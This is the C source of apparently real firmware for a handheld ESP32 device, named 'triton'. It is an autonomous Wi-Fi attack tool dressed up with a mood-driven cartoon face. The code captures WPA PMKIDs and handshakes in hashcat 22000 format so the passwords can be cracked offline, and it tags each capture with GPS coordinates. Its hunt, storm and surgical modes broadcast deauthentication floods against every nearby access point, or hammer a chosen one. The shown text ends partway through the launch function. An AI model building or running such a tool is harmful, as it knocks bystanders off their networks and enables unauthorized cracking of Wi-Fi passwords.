/*
 * triton — autonomous handshake hunter with personality.
 *
 * Poseidon's son runs the capture task in the background and shows a
 * little ASCII face with a mood that reflects how well he's hunting.
 *
 * Under the hood:
 *   - Background FreeRTOS task: channel-hop promisc, EAPOL parse,
 *     hashcat 22000 writer (same logic as wifi_pmkid). Hunt mode
 *     is ALWAYS on — broadcast-deauths every seen BSSID every 3s.
 *   - Mood state machine drives the face + one-line thought bubble.
 *
 * Moods:
 *   SLEEPY   — just started, no captures yet
 *   HUNTING  — actively stalking, no catches yet but >30s in
 *   HUNGRY   — a while with no new catches
 *   STOKED   — just grabbed one, celebratory face for 5s
 *   HUNGRY2  — 5 min dry spell, starting to give up
 *   FERAL    — 10+ captures stacked, unhinged energy
 */
#include "app.h"
#include "../theme.h"
#include "ui.h"
#include "input.h"
#include "radio.h"
#include "menu.h"
#include "c5_cmd.h"
#include "wifi_types.h"
#include "wifi_deauth_frame.h"
#include "../wifi_wardrive.h"
#include "../gps.h"
#include "../sfx.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <SD.h>
#include "../sd_helper.h"

static volatile uint32_t s_pmk   = 0;
static volatile uint32_t s_hs    = 0;
static volatile uint32_t s_eapol = 0;
static volatile uint32_t s_deauth_frames = 0;   /* total deauth/disassoc TX sent this session */
static volatile bool     s_phase_5g = false;    /* false = 2.4 GHz active, true = 5 GHz via C5 */
static volatile uint32_t s_last_catch = 0;
static volatile uint32_t s_born = 0;
static volatile uint8_t  s_ch    = 1;
static volatile bool     s_alive = false;
static File              s_file;
/* Parallel wardrive-compatible CSV — only opened if GPS has a fix
 * during the session. Columns mirror wifi_wardrive's output so a
 * capture session dumps straight into the same WiGLE pipeline. */
static File              s_wdr_file;

/* ---- modes ---- */
enum triton_mode_t {
    TM_HUNT,      /* default: deauth every 3s on every known AP, RL-weighted hops */
    TM_STEALTH,   /* observe-only: no deauths, capture organic handshakes */
    TM_SURGICAL,  /* sit on one selected target's channel, deauth only that BSSID */
    TM_STORM,     /* uniform-random hops, deauth every 1s, max aggression */
};
static volatile triton_mode_t s_mode = TM_HUNT;
static uint8_t s_target_bssid[6] = {0};
static uint8_t s_target_ch       = 1;
static const char *mode_name(triton_mode_t m) {
    switch (m) {
    case TM_HUNT:     return "HUNT";
    case TM_STEALTH:  return "STEALTH";
    case TM_SURGICAL: return "SURGICAL";
    case TM_STORM:    return "STORM";
    }
    return "?";
}
static const char *mode_blurb(triton_mode_t m) {
    switch (m) {
    case TM_HUNT:     return "default. deauth + RL hopping";
    case TM_STEALTH:  return "passive observe, no TX";
    case TM_SURGICAL: return "lock to one AP, hammer it";
    case TM_STORM:    return "max aggression, every 1s";
    }
    return "";
}

/* ---- adaptive learning (lightweight RL) ----
 * Per-channel value estimate. Each successful capture on channel c
 * bumps s_q[c]; hop task weights dwell time by softmax of these values.
 * Persisted to SD so Triton gets smarter across power cycles.
 */
#define NCH 14  /* indices 1..13 used */
static float s_q[NCH];          /* running value */
static uint32_t s_visits[NCH];  /* times we've dwelled on this ch */
static uint32_t s_wins[NCH];    /* captures made while on this ch */

static void triton_learn_load(void)
{
    for (int i = 0; i < NCH; ++i) {
        s_q[i] = 0.5f;  /* neutral prior */
        s_visits[i] = 0;
        s_wins[i] = 0;
    }
    sd_remount();  /* ensure SD is accessible after CC1101 may have stolen SPI */
    File f = SD.open("/poseidon/triton_brain.bin", FILE_READ);
    if (f && f.size() == (int)(sizeof(s_q) + sizeof(s_visits) + sizeof(s_wins))) {
        f.read((uint8_t *)s_q, sizeof(s_q));
        f.read((uint8_t *)s_visits, sizeof(s_visits));
        f.read((uint8_t *)s_wins, sizeof(s_wins));
    }
    if (f) f.close();
}

static void triton_learn_save(void)
{
    sd_remount();
    File f = SD.open("/poseidon/triton_brain.bin", FILE_WRITE);
    if (!f) return;
    f.write((const uint8_t *)s_q, sizeof(s_q));
    f.write((const uint8_t *)s_visits, sizeof(s_visits));
    f.write((const uint8_t *)s_wins, sizeof(s_wins));
    f.close();
}

/* Reward the currently-active channel whenever a capture lands. */
static void triton_reward(uint8_t ch)
{
    if (ch < 1 || ch > 13) return;
    const float alpha = 0.2f;       /* learning rate */
    s_q[ch] += alpha * (1.0f - s_q[ch]);
    s_wins[ch]++;
}

/* Pick the next channel: 80% softmax by learned value, 20% random
 * exploration so dead channels still get periodic probes. */
static uint8_t triton_pick_channel(void)
{
    if ((esp_random() & 0xFF) < 51) {
        return 1 + (esp_random() % 13);
    }
    float total = 0;
    for (int i = 1; i <= 13; ++i) total += s_q[i] + 0.05f;
    float r = ((float)(esp_random() & 0xFFFF) / 65536.0f) * total;
    float acc = 0;
    for (int i = 1; i <= 13; ++i) {
        acc += s_q[i] + 0.05f;
        if (r <= acc) return (uint8_t)i;
    }
    return 1 + (esp_random() % 13);
}

/* Cache: BSSID -> SSID (from beacons) so handshakes get real ESSID.
 * Written from cb() on the Wi-Fi task, read from hop_task + SD writer on
 * another core — guarded by s_bs_mux to prevent torn reads of BSSID/SSID. */
struct bs_t { uint8_t bssid[6]; char ssid[33]; };
#define BS_N 24
static bs_t s_bs[BS_N];
static volatile int s_bs_n = 0;
static portMUX_TYPE s_bs_mux = portMUX_INITIALIZER_UNLOCKED;

/* Deferred capture queue. Wi-Fi promisc callback runs in the Wi-Fi task
 * at high priority and MUST NOT do SPI I/O — it'd contend with the SD
 * mutex and has tripped WDT resets in past testing. Callback builds the
 * hashcat line and enqueues it; hop_task drains + flushes to SD. */
struct capture_t { char line[1024]; };
#define CAPTURE_Q 8
static capture_t s_capq[CAPTURE_Q];
static volatile int s_capq_head = 0;
static volatile int s_capq_tail = 0;
static portMUX_TYPE s_capq_mux = portMUX_INITIALIZER_UNLOCKED;

static void capture_enqueue(const char *line)
{
    portENTER_CRITICAL(&s_capq_mux);
    int next = (s_capq_head + 1) % CAPTURE_Q;
    if (next != s_capq_tail) {
        strncpy(s_capq[s_capq_head].line, line, sizeof(s_capq[0].line) - 1);
        s_capq[s_capq_head].line[sizeof(s_capq[0].line) - 1] = '\0';
        s_capq_head = next;
    }
    /* On queue full we drop — better than blocking the Wi-Fi task. */
    portEXIT_CRITICAL(&s_capq_mux);
}

static void capture_flush(void)
{
    while (true) {
        char line[1024];
        bool have = false;
        portENTER_CRITICAL(&s_capq_mux);
        if (s_capq_tail != s_capq_head) {
            strncpy(line, s_capq[s_capq_tail].line, sizeof(line) - 1);
            line[sizeof(line) - 1] = '\0';
            s_capq_tail = (s_capq_tail + 1) % CAPTURE_Q;
            have = true;
        }
        portEXIT_CRITICAL(&s_capq_mux);
        if (!have) break;
        if (s_file) {
            s_file.print(line);
            s_file.flush();
        }
    }
}

/* Pending M1 for (BSSID, STA) pair awaiting M2. */
struct m1_t {
    uint8_t bssid[6], sta[6], anonce[32];
    uint8_t m1_eapol[256];
    int     m1_len;
    uint32_t ts;
};
#define M1_N 8
static m1_t s_m1[M1_N];
static volatile int s_m1_n = 0;

/* Caller copies the SSID into a local buffer under the mux — returning
 * a pointer to s_bs[].ssid would let it be overwritten mid-use. */
static void ssid_of(const uint8_t *b, char *out, size_t out_sz)
{
    out[0] = '\0';
    portENTER_CRITICAL(&s_bs_mux);
    for (int i = 0; i < s_bs_n; ++i) {
        if (memcmp(s_bs[i].bssid, b, 6) == 0) {
            strncpy(out, s_bs[i].ssid, out_sz - 1);
            out[out_sz - 1] = '\0';
            break;
        }
    }
    portEXIT_CRITICAL(&s_bs_mux);
}

static void hexcat(char *dst, const uint8_t *src, int n)
{
    int o = strlen(dst);
    for (int i = 0; i < n; ++i) o += sprintf(dst + o, "%02x", src[i]);
}

/* Append a wardrive-compatible row for this capture if GPS has a fix.
 * Column layout matches wifi_wardrive.cpp so post-processing tooling
 * only has to know one format. Type is EAPOL_PMKID or EAPOL_HS to
 * distinguish from wardrive's beacon-based BEACON rows. */
static void wdr_append(const uint8_t *bssid, const char *ssid,
                       const char *type)
{
    gps_fix_t g;
    if (!gps_snapshot(&g) || !g.valid || g.sats == 0) return;
    if (!s_wdr_file) {
        s_wdr_file = sdlog_open("triton-wardrive",
            "MAC,SSID,AuthMode,FirstSeen,Channel,RSSI,"
            "CurrentLatitude,CurrentLongitude,AltitudeMeters,"
            "AccuracyMeters,Type", nullptr, 0);
        if (!s_wdr_file) return;
    }
    s_wdr_file.printf("%02X:%02X:%02X:%02X:%02X:%02X,\"%s\",WPA2,%s,%u,0,"
                      "%.7f,%.7f,%.1f,%.1f,%s\n",
                      bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
                      ssid, g.utc, s_ch,
                      g.lat_deg, g.lon_deg, g.alt_m, g.hdop, type);
    s_wdr_file.flush();
}

static void emit_pmkid(const uint8_t *pmkid, const uint8_t *bssid, const uint8_t *sta)
{
    char ssid[33]; ssid_of(bssid, ssid, sizeof(ssid));
    char line[300] = "WPA*01*";
    hexcat(line, pmkid, 16); strcat(line, "*");
    hexcat(line, bssid, 6);  strcat(line, "*");
    hexcat(line, sta, 6);    strcat(line, "*");
    for (size_t i = 0; i < strlen(ssid); ++i) {
        char h[3]; snprintf(h, sizeof(h), "%02x", (uint8_t)ssid[i]);
        strcat(line, h);
    }
    strcat(line, "***\n");
    capture_enqueue(line);
    wdr_append(bssid, ssid, "EAPOL_PMKID");
    s_pmk++;
    s_last_catch = millis();
    triton_reward(s_ch);
}

static void emit_hs(const uint8_t *bssid, const uint8_t *sta,
                    const uint8_t *mic, const uint8_t *anonce,
                    const uint8_t *m2, int m2_len)
{
    /* A real EAPOL M2 is ~121 bytes. Cap defensively so a malformed
     * frame (sig_len up to ~2300) can't smash the 1024-byte stack line
     * buffer via hexcat(m2, m2_len) which writes m2_len*2 hex chars. */
    if (m2_len > 256) m2_len = 256;
    if (m2_len < 0)   m2_len = 0;

    char ssid[33]; ssid_of(bssid, ssid, sizeof(ssid));
    char line[1024] = "WPA*02*";
    hexcat(line, mic, 16);    strcat(line, "*");
    hexcat(line, bssid, 6);   strcat(line, "*");
    hexcat(line, sta, 6);     strcat(line, "*");
    for (size_t i = 0; i < strlen(ssid); ++i) {
        char h[3]; snprintf(h, sizeof(h), "%02x", (uint8_t)ssid[i]);
        strcat(line, h);
    }
    strcat(line, "*");
    hexcat(line, anonce, 32); strcat(line, "*");
    hexcat(line, m2, m2_len); strcat(line, "*02\n");
    capture_enqueue(line);
    wdr_append(bssid, ssid, "EAPOL_HS");
    s_hs++;
    s_last_catch = millis();
    triton_reward(s_ch);
}

static m1_t *m1_slot(const uint8_t *b, const uint8_t *s)
{
    for (int i = 0; i < s_m1_n; ++i)
        if (!memcmp(s_m1[i].bssid, b, 6) && !memcmp(s_m1[i].sta, s, 6))
            return &s_m1[i];
    if (s_m1_n >= M1_N) {
        int o = 0;
        for (int i = 1; i < s_m1_n; ++i) if (s_m1[i].ts < s_m1[o].ts) o = i;
        return &s_m1[o];
    }
    m1_t *e = &s_m1[s_m1_n++];
    memcpy(e->bssid, b, 6); memcpy(e->sta, s, 6);
    return e;
}

static void handle_eapol(const uint8_t *frame, int len)
{
    if (len < 40) return;
    uint8_t fc = frame[0], type = (fc >> 2) & 3;
    if (type != 2) return;
    uint8_t from_ds = (frame[1] >> 1) & 1, to_ds = frame[1] & 1;
    int hdr = 24;
    if ((fc >> 4) & 0x8) hdr += 2;
    if (len < hdr + 8) return;
    const uint8_t *llc = frame + hdr;
    if (!(llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03 &&
          llc[6] == 0x88 && llc[7] == 0x8E)) return;
    const uint8_t *eapol = llc + 8;
    int elen = len - (eapol - frame);
    if (elen < 95 || eapol[1] != 0x03) return;

    s_eapol++;

    const uint8_t *bssid, *sta;
    bool from_ap;
    if (from_ds && !to_ds)      { sta = frame + 4; bssid = frame + 10; from_ap = true; }
    else if (to_ds && !from_ds) { bssid = frame + 4; sta = frame + 10; from_ap = false; }
    else return;

    uint16_t key_info = ((uint16_t)eapol[5] << 8) | eapol[6];
    const uint8_t *nonce = eapol + 17;
    const uint8_t *mic = eapol + 81;
    uint16_t kd_len = ((uint16_t)eapol[93] << 8) | eapol[94];
    const uint8_t *kd = eapol + 95;

    /* PMKID walk. */
    if (kd_len >= 22) {
        int off = 0;
        while (off + 2 < kd_len) {
            uint8_t t = kd[off], l = kd[off + 1];
            if (off + 2 + l > kd_len) break;
            if (t == 0xDD && l >= 20 &&
                kd[off+2] == 0x00 && kd[off+3] == 0x0F && kd[off+4] == 0xAC && kd[off+5] == 0x04) {
                emit_pmkid(kd + off + 6, bssid, sta);
                break;
            }
            off += 2 + l;
        }
    }

    bool mic_set     = key_info & (1 << 8);
    bool ack_set     = key_info & (1 << 7);
    bool install_set = key_info & (1 << 6);

    if (from_ap && ack_set && !mic_set && !install_set) {
        /* M1 */
        m1_t *e = m1_slot(bssid, sta);
        if (e) {
            memcpy(e->bssid, bssid, 6);
            memcpy(e->sta, sta, 6);
            memcpy(e->anonce, nonce, 32);
            int cp = elen < (int)sizeof(e->m1_eapol) ? elen : (int)sizeof(e->m1_eapol);
            memcpy(e->m1_eapol, eapol, cp);
            e->m1_len = cp;
            e->ts = millis();
        }
    } else if (!from_ap && mic_set && !ack_set && !install_set) {
        /* M2 */
        m1_t *e = m1_slot(bssid, sta);
        if (e && e->m1_len > 0) emit_hs(bssid, sta, mic, e->anonce, eapol, elen);
    }
}

static void cache_beacon(const uint8_t *bssid, const uint8_t *tags, int len)
{
    if (len < 2 || tags[0] != 0 || tags[1] == 0 || tags[1] > 32) return;
    portENTER_CRITICAL(&s_bs_mux);
    int idx = -1;
    for (int i = 0; i < s_bs_n; ++i)
        if (!memcmp(s_bs[i].bssid, bssid, 6)) { idx = i; break; }
    if (idx < 0) {
        if (s_bs_n >= BS_N) { portEXIT_CRITICAL(&s_bs_mux); return; }
        idx = s_bs_n++;
        memcpy(s_bs[idx].bssid, bssid, 6);
    }
    memcpy(s_bs[idx].ssid, tags + 2, tags[1]);
    s_bs[idx].ssid[tags[1]] = '\0';
    portEXIT_CRITICAL(&s_bs_mux);
}

static void cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    int len = pkt->rx_ctrl.sig_len;
    if (len < 24) return;
    if (type == WIFI_PKT_MGMT) {
        uint8_t st = (pkt->payload[0] >> 4) & 0xF;
        if (st == 0x8 || st == 0x5)
            cache_beacon(pkt->payload + 16, pkt->payload + 36, len - 36 - 4);
    } else if (type == WIFI_PKT_DATA) {
        handle_eapol(pkt->payload, len);
    }
}

static void hop_task(void *)
{
    /* Shared deauth+disassoc pair builder with per-frame sequence numbers.
     * Seeded from esp_random() so Triton's frames don't collide with the
     * interactive deauth feature's seq space when both end up airborne
     * during a session. */
    uint16_t seq = (uint16_t)(esp_random() & 0x0FFF);
    uint32_t last_hunt = 0;
    uint32_t last_save = millis();
    /* Time-slice between 2.4 GHz local attacks and 5 GHz via C5.
     * Concurrent TX (softAP deauth bursts + ESP-NOW C5 commands)
     * exhausts the WiFi TX buffer pool and every 80211_tx returns
     * rc=257. Instead: 10 s of pure 2.4 work, 10 s of pure 5 GHz
     * C5 work. Promiscuous RX stays on either way so we still
     * capture EAPOL from dual-band clients cascading down to 2.4. */
    uint32_t phase_start = millis();
    s_phase_5g = false;
    /* Start in 2.4 GHz phase → ESP-NOW off so local softAP deauth TX
     * doesn't compete for WiFi buffers. The HELLO listener pauses
     * during this phase; peer state is kept. */
    c5_stop();

    while (s_alive) {
        uint32_t ph_now = millis();
        if (ph_now - phase_start > 10000) {
            phase_start = ph_now;
            s_phase_5g = !s_phase_5g;
            /* Phase transition: bring ESP-NOW up for 5G, down for 2.4.
             * c5_begin()/c5_stop() are idempotent so even-number
             * toggles from boot state are safe. */
            if (s_phase_5g) c5_begin();
            else            c5_stop();
            /* Let the WiFi driver settle after mode transitions. */
            vTaskDelay(pdMS_TO_TICKS(120));
        }
        /* Channel selection per mode. */
        switch (s_mode) {
        case TM_SURGICAL:
            s_ch = s_target_ch ? s_target_ch : 1;
            break;
        case TM_STORM:
            s_ch = 1 + (esp_random() % 13);  /* uniform random */
            break;
        case TM_HUNT:
        case TM_STEALTH:
        default:
            s_ch = triton_pick_channel();
            break;
        }
        s_visits[s_ch]++;
        esp_wifi_set_channel(s_ch, WIFI_SECOND_CHAN_NONE);

        /* Deauth cadence per mode. STEALTH never transmits. HUNT + STORM
         * tuned down from earlier 3 s / 1 s to keep pressure on any AP
         * with active clients — 3 s was too polite and most re-auth
         * cycles finished before the next burst landed. */
        uint32_t hunt_period = 0;
        switch (s_mode) {
        case TM_HUNT:     hunt_period = 1500; break;
        case TM_STORM:    hunt_period = 700;  break;
        case TM_SURGICAL: hunt_period = 1200; break;
        case TM_STEALTH:  hunt_period = 0;    break;
        }

        if (!s_phase_5g && hunt_period > 0 && millis() - last_hunt > hunt_period) {
            last_hunt = millis();
            /* 2.4 GHz attack window only. SoftAP per deauth phase
             * (original proven pattern). During the 5 GHz window we
             * skip this entirely so TX buffers aren't contested with
             * the C5 commands firing below. */
            if (wifi_silent_ap_begin(s_ch) != ESP_OK) goto skip_burst;
            if (s_mode == TM_SURGICAL) {
                int bursts = 8;
                for (int k = 0; k < bursts && s_alive; ++k) {
                    int sent = wifi_deauth_broadcast(s_target_bssid, &seq);
                    s_deauth_frames += (uint32_t)(sent > 0 ? sent : 0);
                    delay(5);
                }
            } else {
                uint8_t bssids[BS_N][6];
                int nb = 0;
                portENTER_CRITICAL(&s_bs_mux);
                int cap = s_bs_n > BS_N ? BS_N : s_bs_n;
                for (int i = 0; i < cap; ++i) memcpy(bssids[i], s_bs[i].bssid, 6);
                nb = cap;
                portEXIT_CRITICAL(&s_bs_mux);

                int bursts = (s_mode == TM_STORM) ? 6 : 3;
                for (int i = 0; i < nb && s_alive; ++i) {
                    for (int k = 0; k < bursts; ++k) {
                        int sent = wifi_deauth_broadcast(bssids[i], &seq);
                        s_deauth_frames += (uint32_t)(sent > 0 ? sent : 0);
                        delay(5);
                    }
                }
            }
            wifi_silent_ap_end();
            /* silent_ap_end() disables promisc. Re-arm so the dwell
             * window catches beacons/EAPOL/PMKID. */
            esp_wifi_set_promiscuous(true);
            esp_wifi_set_promiscuous_rx_cb(cb);
            esp_wifi_set_channel(s_ch, WIFI_SECOND_CHAN_NONE);
            skip_burst: ;
        }

        /* Drain any PMKID/handshake captures that the Wi-Fi callback
         * enqueued since the last pass. Running this here keeps SD SPI
         * off the promiscuous RX task. */
        capture_flush();

        /* Dwell per mode. STORM bumped from 200 → 450 so each channel
         * actually sees a couple of beacon cycles (typical cadence is
         * 100 ms) — 200 ms of random hops was blowing past most APs
         * without them getting a single beacon in. */
        int dwell_ms;
        switch (s_mode) {
        case TM_SURGICAL: dwell_ms = 1500; break;
        case TM_STORM:    dwell_ms = 450;  break;
        case TM_STEALTH:  dwell_ms = 800 + (int)(s_q[s_ch] * 1500); break;
        case TM_HUNT:
        default:          dwell_ms = 450 + (int)(s_q[s_ch] * 800);  break;
        }
        delay(dwell_ms);

        if (millis() - last_save > 30000) {
            last_save = millis();
            triton_learn_save();
        }
    }
    capture_flush();       /* flush any trailing captures before exit */
    triton_learn_save();
    vTaskDelete(nullptr);
}

/* ---- mood + face ---- */

enum mood_t { MOOD_SLEEPY, MOOD_HUNTING, MOOD_HUNGRY, MOOD_STOKED, MOOD_DESPAIR, MOOD_FERAL };

static mood_t mood_now(void)
{
    uint32_t now = millis();
    uint32_t age = (now - s_born) / 1000;         /* seconds since launch */
    uint32_t dry = (now - s_last_catch) / 1000;   /* seconds since last catch */
    uint32_t total = s_pmk + s_hs;

    /* Previous logic left Triton stuck in SLEEPY for 30 s then jumped
     * straight to HUNGRY (because total == 0 matched). You never saw
     * "on the hunt" until the first capture landed, which defeats the
     * whole gotchi narrative. New order:
     *   0-8 s: just booted, SLEEPY
     *   8 s+ with 0 caps, <2 min: HUNTING (actively stalking)
     *   2 min+ no caps: HUNGRY
     *   5 min+ no caps: DESPAIR
     * Capture paths unchanged. */
    if (total >= 10)                       return MOOD_FERAL;
    if (total > 0 && dry < 5)              return MOOD_STOKED;
    if (age < 8)                           return MOOD_SLEEPY;
    if (dry > 300)                         return MOOD_DESPAIR;
    if (dry > 120)                         return MOOD_HUNGRY;
    return MOOD_HUNTING;
}

static const char *mood_word(mood_t m)
{
    switch (m) {
    case MOOD_SLEEPY:  return "just waking up...";
    case MOOD_HUNTING: return "on the hunt";
    case MOOD_HUNGRY:  return "where are you...";
    case MOOD_STOKED:  return "GOT ONE!";
    case MOOD_DESPAIR: return "its too quiet";
    case MOOD_FERAL:   return "SEND THEM ALL";
    }
    return "";
}

/* Triton face — cyberpunk gotchi with visor helmet + trident crown.
 * Much cooler than the old circle face. */
static void draw_face(int cx, int cy, mood_t m, uint32_t tick)
{
    auto &d = M5Cardputer.Display;
    uint16_t glow  = T_ACCENT;
    uint16_t glow2 = T_ACCENT2;
    uint16_t dark  = 0x10A2;  /* dark steel */
    uint16_t visor = 0x0000;

    /* Helmet: rounded rectangle with notch. */
    d.fillRoundRect(cx - 24, cy - 20, 48, 40, 6, dark);
    d.drawRoundRect(cx - 24, cy - 20, 48, 40, 6, glow);
    /* Visor band across eyes. */
    d.fillRect(cx - 22, cy - 8, 44, 14, visor);
    d.drawRect(cx - 22, cy - 8, 44, 14, glow);
    /* Chin vent slits. */
    for (int i = 0; i < 3; i++)
        d.drawFastHLine(cx - 6 + i * 4, cy + 12, 3, glow);

    /* Trident crown — glowing, animated pulse. */
    uint8_t pulse = ((tick / 100) % 10);
    uint16_t crown_c = (pulse < 5) ? glow : glow2;
    d.drawFastVLine(cx, cy - 28, 12, crown_c);
    d.fillTriangle(cx, cy - 30, cx - 2, cy - 26, cx + 2, cy - 26, crown_c);
    d.drawFastVLine(cx - 7, cy - 24, 8, crown_c);
    d.fillTriangle(cx - 7, cy - 26, cx - 9, cy - 22, cx - 5, cy - 22, crown_c);
    d.drawFastVLine(cx + 7, cy - 24, 8, crown_c);
    d.fillTriangle(cx + 7, cy - 26, cx + 5, cy - 22, cx + 9, cy - 22, crown_c);
    /* Trident crossbar. */
    d.drawFastHLine(cx - 9, cy - 20, 19, crown_c);

    /* Visor eyes — inside the black visor band. */
    int ey = cy - 2;
    int el = cx - 10, er = cx + 10;
    switch (m) {
    case MOOD_SLEEPY: {
        /* Dim horizontal lines — drowsy scanner bars. */
        bool blink = ((tick / 600) & 1);
        uint16_t ec = blink ? 0x2104 : glow;
        d.drawFastHLine(el - 4, ey, 8, ec);
        d.drawFastHLine(er - 4, ey, 8, ec);
        break;
    }
    case MOOD_HUNTING: {
        /* Scanning pupils — slide left to right. */
        int scan = (tick / 150) % 8;
        d.fillRect(el - 4, ey - 2, 8, 5, glow);
        d.fillRect(er - 4, ey - 2, 8, 5, glow);
        d.fillRect(el - 4 + scan, ey - 1, 2, 3, 0xFFFF);
        d.fillRect(er - 4 + scan, ey - 1, 2, 3, 0xFFFF);
        break;
    }
    case MOOD_HUNGRY: {
        /* Half-lidded — top half dimmed. */
        d.fillRect(el - 4, ey - 1, 8, 3, 0x2104);
        d.fillRect(er - 4, ey - 1, 8, 3, 0x2104);
        d.fillRect(el - 3, ey, 6, 2, glow);
        d.fillRect(er - 3, ey, 6, 2, glow);
        break;
    }
    case MOOD_STOKED: {
        /* Star-burst eyes — bright and pulsing. */
        uint16_t sc = ((tick / 80) & 1) ? 0xFFFF : glow;
        d.fillRect(el - 4, ey - 2, 8, 5, sc);
        d.fillRect(er - 4, ey - 2, 8, 5, sc);
        d.drawPixel(el - 5, ey, sc); d.drawPixel(el + 4, ey, sc);
        d.drawPixel(er - 5, ey, sc); d.drawPixel(er + 4, ey, sc);
        d.drawPixel(el, ey - 3, sc); d.drawPixel(er, ey - 3, sc);
        d.drawPixel(el, ey + 3, sc); d.drawPixel(er, ey + 3, sc);
        break;
    }
    case MOOD_DESPAIR: {
        /* X X — dead/crashed. */
        d.drawLine(el - 3, ey - 2, el + 3, ey + 2, T_BAD);
        d.drawLine(el - 3, ey + 2, el + 3, ey - 2, T_BAD);
        d.drawLine(er - 3, ey - 2, er + 3, ey + 2, T_BAD);
        d.drawLine(er - 3, ey + 2, er + 3, ey - 2, T_BAD);
        break;
    }
    case MOOD_FERAL: {
        /* Red alert — glowing red, pulsing fast. */
        uint16_t fc = ((tick / 60) & 1) ? T_BAD : 0xF800;
        d.fillRect(el - 5, ey - 2, 10, 5, fc);
        d.fillRect(er - 5, ey - 2, 10, 5, fc);
        d.fillRect(el - 2, ey - 1, 4, 3, 0xFFFF);
        d.fillRect(er - 2, ey - 1, 4, 3, 0xFFFF);
        /* Angry brow lines on visor. */
        d.drawLine(el - 5, ey - 5, el + 3, ey - 3, T_BAD);
        d.drawLine(er - 3, ey - 3, er + 5, ey - 5, T_BAD);
        break;
    }
    }

    /* Scan-line effect across visor — subtle horizontal lines. */
    for (int sy = cy - 7; sy < cy + 5; sy += 2)
        d.drawFastHLine(cx - 21, sy, 42, 0x0821);

    /* Mouth / status indicator below visor. */
    int mx = cx, my = cy + 10;
    switch (m) {
    case MOOD_SLEEPY:  d.drawFastHLine(mx - 3, my, 6, glow); break;
    case MOOD_HUNTING: {
        /* Animated comm dots. */
        int dot = (tick / 200) % 4;
        for (int i = 0; i < 3; i++)
            d.fillCircle(mx - 4 + i * 4, my, 1, i <= dot ? glow : dark);
        break;
    }
    case MOOD_HUNGRY:  d.drawLine(mx - 4, my + 2, mx + 4, my, glow); break;
    case MOOD_STOKED: {
        /* Wide grin — curved line. */
        for (int i = -6; i <= 6; i++)
            d.drawPixel(mx + i, my + abs(i) / 2, glow);
        break;
    }
    case MOOD_DESPAIR: d.drawLine(mx - 4, my, mx + 4, my + 2, T_BAD); break;
    case MOOD_FERAL:   {
        /* Jagged teeth. */
        for (int i = -5; i <= 5; i += 2) {
            d.drawLine(mx + i, my, mx + i + 1, my + 2, T_BAD);
            d.drawLine(mx + i + 1, my + 2, mx + i + 2, my, T_BAD);
        }
        break;
    }
    }

    /* Glitch effect — random pixels near face on FERAL/STOKED. */
    if (m == MOOD_FERAL || m == MOOD_STOKED) {
        for (int g = 0; g < 4; g++) {
            int gx = cx - 28 + (esp_random() % 56);
            int gy = cy - 22 + (esp_random() % 44);
            d.drawPixel(gx, gy, (m == MOOD_FERAL) ? T_BAD : glow);
        }
    }
}

/* Mode picker — cursor over 4 cards, ENTER selects, ESC bails. */
static bool pick_mode(void)
{
    auto &d = M5Cardputer.Display;
    int sel = (int)s_mode;
    triton_mode_t modes[4] = { TM_HUNT, TM_STEALTH, TM_SURGICAL, TM_STORM };
    ui_draw_footer(";/. pick  ENTER=launch  `=back");
    int prev_sel = -1;
    while (true) {
        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(30); continue; }
        if (k == PK_ESC) return false;
        if (k == ';' || k == PK_UP)   { if (sel > 0) sel--; }
        if (k == '.' || k == PK_DOWN) { if (sel < 3) sel++; }
        if (k == PK_ENTER) { s_mode = modes[sel]; return true; }

        if (sel != prev_sel || prev_sel < 0) {
            prev_sel = sel;
            ui_force_clear_body();
            d.setTextColor(T_ACCENT2, T_BG);
            d.setCursor(4, BODY_Y + 2); d.print("TRITON MODE");
            d.drawFastHLine(4, BODY_Y + 12, 100, T_ACCENT2);
            for (int i = 0; i < 4; ++i) {
                int y = BODY_Y + 18 + i * 14;
                bool s = (i == sel);
                if (s) {
                    d.fillRoundRect(2, y - 1, SCR_W - 4, 13, 2, T_SEL_BG);
                    d.drawRoundRect(2, y - 1, SCR_W - 4, 13, 2, T_SEL_BD);
                }
                d.setTextColor(s ? T_ACCENT : T_FG, s ? T_SEL_BG : T_BG);
                d.setCursor(6, y);  d.printf("%-8s", mode_name(modes[i]));
                d.setTextColor(s ? T_FG : T_DIM, s ? T_SEL_BG : T_BG);
                d.setCursor(80, y); d.print(mode_blurb(modes[i]));
            }
            ui_draw_footer(";/. pick  ENTER=launch  `=back");
        }
    }
}

/* If SURGICAL, ask user to pick a target AP from the last WiFi scan
 * results (g_last_selected_ap) — falls back to a quick scan. */
static bool pick_surgical_target(void)
{
    extern ap_t g_last_selected_ap;
    extern bool g_last_selected_valid;
    if (g_last_selected_valid) {
        memcpy(s_target_bssid, g_last_selected_ap.bssid, 6);
        s_target_ch = g_last_selected_ap.channel ? g_last_selected_ap.channel : 1;
        return true;
    }
    ui_toast("scan + pick AP first", T_WARN, 1500);
    return false;
}

void feat_triton(void)
{
    radio_switch(RADIO_WIFI);
    WiFi.mode(WIFI_STA);

    if (!pick_mode()) return;
    if (s_mode == TM_SURGICAL && !pick_surgical_target()) return;

    if (!sd_mount()) { ui_toast("SD needed", T_BAD, 1500); return; }
    SD.mkdir("/poseidon");
    s_file = SD.open("/poseidon/hashcat.22000", FILE_APPEND);
    if (!s_file) { ui_toast("file open fail", T_BAD, 1500); return; }

    triton_learn_load();
    s_pmk = 0; s_hs = 0; s_eapol = 0; s_deauth_frames = 0;
    s_bs_n = 0; s_m1_n = 0;

    /* Seed BSSID→SSID cache from any prior wardrive session. Triton
     * would otherwise emit hashcat lines with blank ESSID until it
     * catches a beacon from scratch — often 15-30 seconds of captures
     * wasted. Seeding closes that gap. */
    if (g_wdr_ap_count > 0) {
        int seeded = 0;
        int limit = g_wdr_ap_count < BS_N ? g_wdr_ap_count : BS_N;
        for (int i = 0; i < limit; ++i) {
            memcpy(s_bs[i].bssid, g_wdr_aps[i].bssid, 6);
            strncpy(s_bs[i].ssid, g_wdr_aps[i].ssid, sizeof(s_bs[i].ssid) - 1);
            s_bs[i].ssid[sizeof(s_bs[i].ssid) - 1] = '\0';
            seeded++;
        }
        s_bs_n = seeded;
        Serial.printf("[triton] seeded %d BSSID->SSID from wardrive\n", seeded);
    }

